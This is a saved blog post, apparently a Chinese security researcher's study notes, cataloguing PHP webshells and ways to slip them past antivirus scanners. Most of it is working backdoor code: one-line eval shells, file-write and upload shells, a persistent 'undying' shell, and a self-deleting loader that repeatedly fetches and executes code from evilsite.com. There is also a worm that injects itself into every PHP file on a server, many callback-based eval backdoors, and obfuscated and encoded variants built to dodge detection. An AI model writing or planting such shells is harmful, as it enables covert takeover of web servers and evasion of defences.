@@ -1,0 +1,1248 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>中国特色PHP大马 | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              中国特色PHP大马
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-11-01
+              </span>
+              <span>
+                39 min read
+              </span>
+              
+                <a href="https://su18.org/tag/pPj3ux0XY/" class="post-tag">
+                  # PHP
+                </a>
+              
+                <a href="https://su18.org/tag/bbwakgnJvv/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+                <a href="https://su18.org/tag/4JBdqT7-Dd/" class="post-tag">
+                  # Webshell
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/su18.php.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="一-前言">一、前言</h1>
+<p>本篇为PHP 常见类型 webshell 学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记学习笔记</p>
+<h1 id="二-简介">二、简介</h1>
+<h2 id="1一句话">1.一句话</h2>
+<p>首先，最常见的为一句话木马，最基础的形式为：</p>
+<pre><code class="language-php">&lt;?php @eval($_POST['hacker']); ?&gt;
+&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;
+</code></pre>
+<p>通过 eval/assert 等能够将字符串作为php代码执行的能力，将 <code>$_POST</code>/<code>$_REQUEST</code>/<code>$_GET</code> 中传递的字符串作为PHP代码执行</p>
+<p>其中，eval : PHP 4, PHP 5, PHP 7+ 均可用，接受一个参数，将字符串作为 PHP 代码执行</p>
+<p>assert: PHP 4, PHP 5, PHP 7.2 以下均可用，一般接受一个参数，php 5.4.8 版本后可以接受两个参数</p>
+<p>这种形式只在服务器上留下一行代码，因此称为一句话木马</p>
+<p>还在网上看到了最短一句话，使用反引号无回显执行命令</p>
+<pre><code class="language-php">&lt;?=`$_GET[1]`;
+</code></pre>
+<h2 id="2小马">2.小马</h2>
+<p>小马可以理解为通过较少的代码，来实现具体在渗透测试中需要的某些功能，即能完成写入文件、列目录、查看文件、执行一些系统命令等少量功能的 Webshell</p>
+<p>如写文件小马：</p>
+<pre><code class="language-php">&lt;?php
+$test='&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;';
+file_put_contents(&quot;Trojan.php&quot;, $test);
+?&gt;
+</code></pre>
+<p>文件上传马：</p>
+<pre><code class="language-php">&lt;?php
+header(&quot;content-Type: text/html; charset=utf-8&quot;);
+?&gt;
+&lt;? 
+echo
+&quot;&lt;/br&gt;获取服务器IP地址: &quot;.$_SERVER['HTTP_HOST'].
+&quot;&lt;/br&gt;获取服务信息: &quot;.apache_get_version();
+?&gt;
+&lt;form method=&quot;POST&quot;&gt;&lt;/br&gt;
+shell路径: &lt;input type=&quot;text&quot; name=&quot;file&quot; size=&quot;60&quot; value=&quot;&lt;? echo str_replace('\\','/',__FILE__) ?&gt;&quot;&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;textarea name=&quot;text&quot; COLS=&quot;70&quot; ROWS=&quot;18&quot; &gt;&lt;/textarea&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;保存&quot;&gt; 
+&lt;form&gt;
+&lt;?php
+error_reporting(0);
+if ($_POST){
+	$f=fopen($_POST[&quot;file&quot;],&quot;w&quot;);
+	echo   fwrite($f,$_POST[&quot;text&quot;])? '保存成功!' : '保存失败!';
+}
+?&gt;
+</code></pre>
+<p>UDF提权马等等</p>
+<p>小马由于代码量不是特别多，免杀方便，可直接实现某些功能，在渗透中也是能够经常用到的，在网上可以搜集到格式各样的小马</p>
+<h2 id="3大马">3.大马</h2>
+<p>PHP大马就是功能较全，支持各种在渗透过程中可能用到的各种功能的大型代码集合，通常具有文件管理、命令执行、端口扫描、数据库管理、反弹shell等等的功能</p>
+<p>常见的如adminer、phpspy 等等，这里就不列举和截图了</p>
+<h2 id="4不死马">4.不死马</h2>
+<p>内存马，通俗讲就是不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行</p>
+<p>网上流传的如：</p>
+<pre><code class="language-php">&lt;?php 
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = '2.php';
+$code = '&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;){@eval($_POST[a]);} ?&gt;';
+while (1){
+    file_put_contents($file,$code);
+    system('touch -m -d &quot;2018-12-01 09:10:12&quot; .2.php');
+    usleep(5000);
+} 
+?&gt;
+</code></pre>
+<p>可以看到，代码通过死循环创建webshell文件</p>
+<h2 id="5无文件木马">5.无文件木马</h2>
+<p>所谓无文件木马，这里指的是自删除的木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中</p>
+<p>例如：</p>
+<pre><code class="language-php">&lt;?php
+unlink($_SERVER['SCRIPT_FILENAME']);
+ignore_user_abort(true);
+set_time_limit(0);
+
+$remote_file = 'http://www.evilsite.com/eval.txt';
+while($code = file_get_contents($remote_file)){
+  @eval($code);
+  sleep(5);
+};
+?&gt;
+</code></pre>
+<p>eval.txt中的内容可进行自定义</p>
+<p>如上代码，在访问一次后会自删除，但eval.txt中的代码依旧会在后台执行</p>
+<h2 id="6蠕虫马">6.蠕虫马</h2>
+<p>一提到蠕虫，就知道这是一个交叉感染的木马，它可以把本地的php会写shell插入到其他php原文件，还增加了相互复活机制，后期增加与其他已感染的主机中的webshell互相复活</p>
+<p>来自于 3s_NWGeek 的代码：</p>
+<pre><code class="language-php">&lt;?php
+$tips = 'AWD_Light_Check';
+//这个是后面检查的是否感染头，如果没有，就会重写这个php
+error_reporting(0);
+$Serv_Num = 159;
+//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。
+$arr_dir = array();
+//全局变量，扫到的文件夹
+$files = array();
+//全局变量，扫到的文件
+if (!function_exists('Url_Check')) {
+    function Url_Check()
+    {
+        $pageURL = 'http';
+        if ($_SERVER[&quot;HTTPS&quot;] == &quot;on&quot;) {
+            $pageURL .= &quot;s&quot;;
+        }
+        $pageURL .= '://';
+        $pageURL .= $_SERVER[&quot;SERVER_NAME&quot;] . &quot;:&quot; . $_SERVER[&quot;SERVER_PORT&quot;];
+        return $pageURL;
+    }
+    function file_check($dir)
+    {
+        //扫描文件夹
+        global $arr_dir;
+        global $files;
+        if (is_dir($dir)) {
+            if ($handle = opendir($dir)) {
+                while (($file = readdir($handle)) !== false) {
+                    if ($file != '.' &amp;&amp; $file != &quot;..&quot;) {
+                        if (is_dir($dir . &quot;/&quot; . $file)) {
+                            $arr_dir[] = $dir;
+                            $files[$file] = file_check($dir . &quot;/&quot; . $file);
+                            //拼接文件
+                        } else {
+                            $arr_dir[] = $dir;
+                            $files[] = $dir . &quot;/&quot; . $file;
+                        }
+                    }
+                }
+            }
+        }
+        closedir($handle);
+        $arr_dir = array_unique($arr_dir);
+        //去重
+    }
+    function write_conf()
+    {
+        #每个目录创一个马
+        global $Serv_Num;
+        global $arr_dir;
+        foreach ($arr_dir as $dir_path) {
+            // echo '&lt;br&gt;'.$dir_path;
+            $srcode = '';
+            $localtext = file(__FILE__);
+            for ($i = 0; $i &lt; $Serv_Num; $i++) {
+                $srcode .= $localtext[$i];
+            }
+            //所有文件夹都生成一个webshell
+            // echo &quot;&lt;span style='color:#666'&gt;&lt;/span&gt; &quot; . $dir_path . &quot;/.Conf_check.php&quot; . &quot;&lt;br/&gt;&quot;;
+            $le = Url_Check();
+            echo '&lt;iframe id=&quot;check_url&quot;&gt;' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir_path . &quot;/.Conf_check.php&quot;) . '&lt;/iframe&gt;';
+            fputs(fopen($dir_path . &quot;/.Conf_check.php&quot;, &quot;w&quot;), $srcode);
+        }
+        // 当前目录所有php被感染
+    }
+    function vul_tran()
+    {
+        //每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。
+        //######
+        global $Serv_Num;
+        $pdir = dirname(__FILE__);
+        //要获取的目录
+        //先判断指定的路径是不是一个文件夹
+        if (is_dir($pdir)) {
+            if ($dh = opendir($pdir)) {
+                while (($fi = readdir($dh)) != false) {
+                    //文件名的全路径 包含文件名
+                    $file_Path = $pdir . '/' . $fi;
+                    if (strpos($file_Path, '.php')) {
+                        //筛选当前目录.php后缀
+                        $le = Url_Check();
+                        $file_Path = str_replace('\\', '/', $file_Path);
+                        echo '&lt;iframe id=&quot;check_url&quot;&gt;' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '', $file_Path) . '&lt;/iframe&gt;';
+                        $ftarget = file($file_Path);
+                        if (!strpos($ftarget[0], 'AWD_Light_Check')) {
+                            //检查头部是否传播
+                            $scode = '';
+                            $localtext = file(__FILE__);
+                            for ($i = 0; $i &lt; $Serv_Num; $i++) {
+                                $scode .= $localtext[$i];
+                            }
+                            $code_check = '';
+                            $file_check = fopen($file_Path, &quot;r&quot;);
+                            //复制要传播的文件代码，进行重写
+                            while (!feof($file_check)) {
+                                $code_check .= fgets($file_check) . &quot;\n&quot;;
+                            }
+                            fclose($file_check);
+                            $webpage = fopen($file_Path, &quot;w&quot;);
+                            fwrite($webpage, $scode . $code_check);
+                            fclose($webpage);
+                        }
+                    }
+                }
+                closedir($dh);
+            }
+        }
+    }
+}
+///////////////////////////////////////////////////////////////////////////////////
+//主函数
+try {
+    //定义特征才启动传播模式，特征值为_
+    if (isset($_GET['_'])) {
+        $host = Url_Check();
+        file_check($_SERVER['DOCUMENT_ROOT']);
+        //全局扫描
+        write_conf();
+        //写入单文件
+        vul_tran();
+        //感染当前目录
+    } elseif (isset($_GET['time']) &amp;&amp; isset($_GET['salt']) &amp;&amp; isset($_GET['sign'])) {
+        #客户端数字签名校验
+        $Check_key = '9c82746189f3d1815f1e6bfe259dac29';
+        $Check_api = $_GET['check'];
+        $timestamp = $_GET['time'];
+        $salt = $_GET['salt'];
+        $csign = $_GET['sign'];
+        $sign = md5($Check_api . $Check_key . $timestamp . $salt);
+        if ($sign === $csign) {
+            $nomal_test = '';
+            for ($i = 0; $i &lt; strlen($Check_api); $i++) {
+                $nomal_test .= chr(ord($Check_api[$i]) ^ $i % $salt);
+            }
+            $nomal_test = base64_decode($nomal_test);
+            $nowtime = time();
+            if (abs($nowtime - $timestamp) &lt;= 5) {
+                $enc = base64_encode(rawurlencode(`{$nomal_test}`));
+                //解密并执行命令在加密返回
+                $pieces = explode(&quot;i&quot;, $enc);
+                $final = &quot;&quot;;
+                foreach ($pieces as $val) {
+                    $final .= $val . &quot;cAFAcABAAswTA2GE2c&quot;;
+                }
+                $final = str_replace(&quot;=&quot;, &quot;:kcehc_revres&quot;, $final);
+                echo strrev(substr($final, 0, strlen($final) - 18));
+                exit;
+            } else {
+                header('HTTP/1.1 500 Internal Server Error');
+            }
+        } else {
+            header('HTTP/1.1 500 Internal Server Error');
+        }
+    } else {
+        header('HTTP/1.1 500 Internal Server Error');
+    }
+} catch (Exception $e2) {
+}
+</code></pre>
+<p>作者原文：带一个参数访问我的webshell，全站的php文件都被我感染，都可以当webshell连，都可以执行命令，只要带一个参数访问都可以互相复活。</p>
+<h1 id="三-动态性探究">三、动态性探究</h1>
+<p>大家都说 PHP 动态性强，因此就不怕杀软的疯狂识别，那么到底强在什么地方？</p>
+<p>其实就是因为 PHP 具有一些十分奇特的特性，大体可分为三类，动态特性类，代码漏洞类、PHP解析类，下面列举了其中常见的几种</p>
+<h2 id="1可变变量">1.可变变量</h2>
+<p>可变变量允许我们动态地改变一个变量的名称。所有的语言都允许改变变量的值，但是并没有太多的语言允许改变变量的类型，至于支持改变变量的名称的语言就更少了</p>
+<p>例子：</p>
+<pre><code class="language-php">$a='b';
+$$a='c';
+</code></pre>
+<p>这就等价于：</p>
+<pre><code class="language-php">$b='c';
+</code></pre>
+<p>著名的“双刀大法”</p>
+<p>例如：</p>
+<pre><code class="language-php">&lt;?php
+  $b = &quot;assert&quot;;
+  $a = 'b';
+  $$a($_POST['hacker']);
+?&gt;
+</code></pre>
+<h2 id="2可变函数">2.可变函数</h2>
+<p>如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它</p>
+<p>利用可变函数，我们可以将函数名也作为参数进行传递，避免敏感关键字被静态检测识别出来</p>
+<p>例如：</p>
+<pre><code class="language-php">@$_GET['a']($_POST['cmd']);
+</code></pre>
+<p>此例一般都是使用<code>assert</code>，因为<code>eval</code>不能被可变函数调用</p>
+<h2 id="3回调函数">3.回调函数</h2>
+<p>回调函数是指调用函数的时候将另一个函数作为参数传递到调用的函数中，而不是传递一个普通的变量作为参数</p>
+<p>使用回调函数是为了可以将一段自己定义的功能传到函数内部使用</p>
+<p>众所周知回调函数也是十分危险的</p>
+<p>最简单的如：</p>
+<pre><code class="language-php">&lt;?php @call_user_func(eval,$_POST['hacker']); ?&gt;
+</code></pre>
+<p>结合可变函数：</p>
+<pre><code class="language-php">&lt;?php
+function newsSearch($para0,$para1){
+    $evil=$para0;
+
+    call_user_func_array($para1,array($evil));
+}
+$exec=base64_decode($_GET['id']);
+newsSearch($_POST['tid'],$exec);
+?&gt;
+</code></pre>
+<p>目前来讲，大部分常见的能作为后门的回调函数和类都被各大杀软列入名单，但是还是能够找到一些较生僻的回调函数，能够用来绕过杀软。</p>
+<p>在函数描述中，参数列表中使用伪类型 <code>callback</code> 描述的，即是回调函数</p>
+<p>目前常见的回调函数有</p>
+<p>uasort/uksort</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+$arr = array('test', $_REQUEST['pass']);
+uasort($arr, base64_decode($e));
+
+$e = $_REQUEST['e'];
+$arr = array('test' =&gt; 1, $_REQUEST['pass'] =&gt; 2);
+uksort($arr, $e);
+
+$arr = new ArrayObject(array('test', $_REQUEST['pass']));
+$arr-&gt;uasort('assert');
+
+$arr = new ArrayObject(array('test' =&gt; 1, $_REQUEST['pass'] =&gt; 2));
+$arr-&gt;uksort('assert');
+</code></pre>
+<p>preg_filter</p>
+<pre><code class="language-php">echo preg_filter('|.*|e', $_REQUEST['pass'], '');
+</code></pre>
+<p>array_filter/array_map</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+$arr = array($_POST['pass'],);
+array_filter($arr, base64_decode($e));
+</code></pre>
+<p>array_walk/array_walk_recursive</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+$arr = array($_POST['pass'] =&gt; '|.*|e',);
+array_walk($arr, $e, '');
+</code></pre>
+<p>array_udiff</p>
+<pre><code class="language-php">function newsSearch($para0,$para1){
+    $evil=$para0;
+    $exec=$para1;
+    array_udiff($arr=array($evil),$arr1 = array(''),$exec);
+}
+$exec=base64_decode($_REQUEST['exec']);
+newsSearch($_POST['key'],$exec);
+
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass']);
+$arr2 = array(1);
+array_udiff($arr, $arr2, $e);
+</code></pre>
+<p>header_register_callback</p>
+<pre><code class="language-php">header_register_callback(create_function('','return assert($_POST[\'k\']);'));
+</code></pre>
+<p>register_tick_function</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+declare(ticks=1);
+register_tick_function($e, $_REQUEST['pass']);
+</code></pre>
+<p>register_shutdown_function</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
+</code></pre>
+<p>mb_ereg_replace</p>
+<pre><code class="language-php">mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+</code></pre>
+<p>mb_ereg_replace_callback</p>
+<pre><code class="language-php">mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);
+</code></pre>
+<p>array_reduce</p>
+<pre><code class="language-php">array_reduce(array($_POST['k']),create_function('$a,$b','return assert($b);'));
+
+$e = $_REQUEST['e'];
+$arr = array(1);
+array_reduce($arr, $e, $_POST['pass']);
+</code></pre>
+<p>set_exception_handler</p>
+<pre><code class="language-php">set_exception_handler(create_function('','return assert($_GET[k]);'));
+throw new exception();
+</code></pre>
+<p>forward_static_call</p>
+<pre><code class="language-php">class a
+{
+  public function __construct($args)
+  {
+    forward_static_call('assert',$args);
+  }
+}
+new a($_POST[k]);
+</code></pre>
+<p>iterator_apply</p>
+<pre><code class="language-php">iterator_apply(new arrayiterator(array($_GET['k'])),create_function('Iterator $i','assert($i-&gt;current());'),array(new arrayiterator(array($_GET['k']))));
+</code></pre>
+<p>array_intersect_ukey</p>
+<pre><code class="language-php">array_intersect_ukey(array($_GET['k']=&gt;'1'),array($_GET['k']=&gt;'1'),'assert');
+</code></pre>
+<p>array_uintersect_uassoc</p>
+<pre><code class="language-php">array_uintersect_uassoc(array($_GET[k]),array(''),'assert','strstr');
+</code></pre>
+<p>array_intersect_uassoc</p>
+<pre><code class="language-php">array_intersect_uassoc(array($_POST['k']=&gt;''),array(''),'assert');
+</code></pre>
+<p>filter_var</p>
+<pre><code class="language-php">filter_var(&quot;phpinfo();&quot; ,1024, array(&quot;options&quot; =&gt; &quot;assert&quot;));
+</code></pre>
+<p>filter_var_array</p>
+<pre><code class="language-php">filter_var_array(array('test' =&gt; $_REQUEST['pass']), array('test' =&gt; array('filter' =&gt; FILTER_CALLBACK, 'options' =&gt; 'assert')));
+</code></pre>
+<p>preg_replace_callback</p>
+<pre><code class="language-php">preg_replace_callback('/. /i', create_function('$arr', 'return assert($arr[0]);'), $_REQUEST['pass']);
+</code></pre>
+<p>无回显回调后门ob_start</p>
+<pre><code class="language-php">ob_start('assert');
+echo $_REQUEST['pass'];
+ob_end_flush();
+</code></pre>
+<p>create_function创建回调函数</p>
+<pre><code class="language-php">$mem = new Memcache();
+$re = $mem-&gt;addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
+$mem-&gt;connect($_REQUEST['pass'], 11211, 0);
+</code></pre>
+<p>CallbackFilterIterator创建回调函数</p>
+<pre><code class="language-php">$iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));
+foreach ($iterator as $item) {echo $item;}
+</code></pre>
+<p>session_set_save_handler</p>
+<pre><code class="language-php">function test($para)
+{
+    session_set_save_handler(&quot;open&quot;, &quot;close&quot;, $para, &quot;write&quot;, &quot;destroy&quot;, &quot;gc&quot;);
+    @session_start(); // 打开会话
+}
+$session = base64_decode($_REQUEST['id']);
+// open第一个被调用，类似类的构造函数
+function open($save_path, $session_name)
+{
+}
+// close最后一个被调用，类似 类的析构函数
+function close()
+{
+}
+// 执行session_id($_REQUEST['op'])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST['op'])
+session_id($_REQUEST['op']);
+function write($id, $sess_data)
+{
+}
+function destroy($id)
+{
+}
+function gc()
+{
+}
+// 第三个参数为read  read(string $sessionId)
+test($session);
+</code></pre>
+<p>还有一些扩展中的回调函数如sqlite/pdo/yaml/memcached等</p>
+<p>PDO数据库回调</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+$db = new PDO('sqlite:sqlite.db3');
+$db-&gt;sqliteCreateFunction('myfunc', $e, 1);
+$sth = $db-&gt;prepare(&quot;SELECT myfunc(:exec)&quot;);
+$sth-&gt;execute(array(':exec' =&gt; $_REQUEST['pass']));
+</code></pre>
+<p>SQLite3 数据库回调</p>
+<pre><code class="language-php">$e = $_REQUEST['e'];
+$db = new SQLite3('sqlite.db3');
+$db-&gt;createFunction('myfunc', $e);
+$stmt = $db-&gt;prepare(&quot;SELECT myfunc(?)&quot;);
+$stmt-&gt;bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
+$stmt-&gt;execute();
+</code></pre>
+<p>php_yaml库</p>
+<pre><code class="language-php">$str = urlencode($_REQUEST['pass']);
+$yaml = &lt;&lt;&lt;EOD
+greeting: !{$str} &quot;|. |e&quot;
+EOD;
+$parsed = yaml_parse($yaml, 0, $cnt, array(&quot;!{$_REQUEST['pass']}&quot; =&gt; 'preg_replace'));
+</code></pre>
+<p>回调函数这里是无穷无尽的</p>
+<h2 id="4反射技术">4.反射技术</h2>
+<pre><code class="language-php">$func = new ReflectionFunction($_GET[m]);
+echo $func-&gt;invokeArgs(array($_GET[c]));
+</code></pre>
+<p>这种方式调用起来也非常的简单<code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code>和动态函数执行的方式十分的相似。但是目前这种方式已经被各种安全防护软件识别了。</p>
+<h2 id="5正则-e-模式">5.正则 \e 模式</h2>
+<p>这本是 php 中可能存在的命令执行漏洞的位置，使用 <code>\e</code> 将替换串中的内容当作代码来执行。</p>
+<p>常用作一句话木马</p>
+<pre><code class="language-php">@preg_replace('/(.*)/e','\\1',$_REQUEST['a']);
+</code></pre>
+<h2 id="6反序列化执行">6.反序列化执行</h2>
+<p>与正则 \e 模式想法类似，使用不安全的处理方式构成代码执行漏洞，用作webshell</p>
+<pre><code class="language-php">class foo{
+    public $data=&quot;text&quot;;
+    function __destruct()
+    {
+        eval($this-&gt;data);
+    }
+}
+$file_name=$_GET['id'];
+unserialize($file_name);
+</code></pre>
+<p>我们需要在本地构造序列化的数据。构造好了之后，通过<code>shell.php?id=id=O:3:&quot;foo&quot;:1:{s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;}</code>，这样就能够执行<code>phpinfo();</code>命令了</p>
+<h2 id="7文件引入">7.文件引入</h2>
+<p>PHP 中使用 include 引入的文件将会以 php 代码进行解析</p>
+<p>因此可以通过引入的方法将恶意代码存留在其他位置</p>
+<p>远程文件包含，这个不多说，需要开配置</p>
+<p>本地文件包含引入 ntfs 流：</p>
+<pre><code class="language-php">include('aaa.png');
+</code></pre>
+<p>在 aaa.png 中写入恶意代码</p>
+<p>包含smb共享文件</p>
+<pre><code class="language-php">include('\\\evilsite.com\1.php');
+</code></pre>
+<p>这种只有Windows_PHP 服务器才可以利用UNC特性包含局域网SMB服务共享的文件，https://www.freebuf.com/articles/web/203577.html</p>
+<h1 id="四-过静态检测">四、过静态检测</h1>
+<p>那么接下来就是如何使我们的代码绕过各种杀软的检测呢？</p>
+<h2 id="1字符串处理">1.字符串处理</h2>
+<h3 id="1-字符串变形">(1) 字符串变形</h3>
+<p>字符串变形就是利用各种字符串处理函数将一些可能被杀软识别的关键字变形，做到通过简单正则无法识别的地步</p>
+<p>以下为一些常见的处理函数</p>
+<pre><code class="language-php">ucwords() //函数把字符串中每个单词的首字符转换为大写
+ucfirst() //函数把字符串中的首字符转换为大写
+trim() //函数从字符串的两端删除空白字符和其他预定义字符
+substr_replace() //函数把字符串的一部分替换为另一个字符串
+substr() //函数返回字符串的一部分
+strtr() //函数转换字符串中特定的字符
+strtoupper() //函数把字符串转换为大写
+strtolower() //函数把字符串转换为小写
+strtok() //函数把字符串分割为更小的字符串
+str_rot13() //函数对字符串执行 ROT13 编码
+</code></pre>
+<p>这部分看心情随便写，变法无穷无尽，下面仅列举几个简单例子：</p>
+<p>替换</p>
+<pre><code class="language-php">&lt;?php
+$x='$_PO'.&quot;STasdasd[&quot;.'1]';
+$x = $x.str_replace('STasdasd',&quot;ST[&quot;);
+
+for ($x=0; $x&lt;=0; $x++) {
+    assert(&quot;$x&quot;);
+}
+</code></pre>
+<p>将关键函数进行倒转和空格，之后利用<code>strrev</code>和<code>str_replace</code>恢复</p>
+<pre><code class="language-php">$b=strrev(&quot;edoced_4&quot;.&quot;6esab&quot;);eval($b(str_replace(&quot; &quot;,&quot;&quot;,&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;)));
+</code></pre>
+<p>str_rot13</p>
+<pre><code class="language-php">preg_replace(&quot;/[errorpage]/e&quot;, @str_rot13('@nffreg($_CBFG[cntr]);'), &quot;saft&quot;);
+</code></pre>
+<h3 id="2-字符串拼接">(2) 字符串拼接</h3>
+<p>字符串拼接的方式也常常用来分割危险关键字，由于PHP的灵活性，这种写法就有非常多</p>
+<p>如下例，使用<code> .</code> 进行字符串拼接，利用可变函数调用：</p>
+<pre><code class="language-php">$k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} ['pass']);
+</code></pre>
+<p>或者</p>
+<pre><code class="language-php">$a=base64_decode(&quot;Y&quot;.&quot;X&quot;.&quot;N&quot;.&quot;z&quot;.&quot;Z&quot;.&quot;X&quot;.&quot;J&quot;.&quot;0&quot;);
+$a(@${&quot;_P&quot;.&quot;O&quot;.&quot;S&quot;.&quot;T&quot;}[pass]);
+</code></pre>
+<p>利用注释</p>
+<pre><code class="language-php">@$_=&quot;s&quot;.&quot;s&quot;./*-/*-*/&quot;e&quot;./*-/*-*/&quot;r&quot;;
+@$_=/*-/*-*/&quot;a&quot;./*-/*-*/$_./*-/*-*/&quot;t&quot;;
+@$_/*-/*-*/($/*-/*-*/{&quot;_P&quot;./*-/*-*/&quot;OS&quot;./*-/*-*/&quot;T&quot;}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // 密码-7
+</code></pre>
+<p>除了用注释分隔关键字，还看到了一种玩法，不过已经挂了</p>
+<pre><code class="language-PHP">&lt;?php #eval($_);exit();
+$_ = @$_POST['1'];
+eval(str_replace('&lt;?php #', '', file_get_contents(__FILE__)));
+</code></pre>
+<p>先声明字符串，之后通过从字符串中进行取值，得到所需要的敏感函数</p>
+<pre><code class="language-php">$sF = &quot;PCT4BA6ODSE_&quot;;
+$s21 = strtolower($sF[4] . $sF[5] . $sF[9] . $sF[10] . $sF[6] . $sF[3] . $sF[11] . $sF[8] . $sF[10] . $sF[1] . $sF[7] . $sF[8] . $sF[10]);
+$s22 = ${strtoupper($sF[11] . $sF[0] . $sF[7] . $sF[9] . $sF[2])}['n985de9'];
+if (isset($s22)) {
+    eval($s21($s22));
+}
+</code></pre>
+<p>变形加拼接</p>
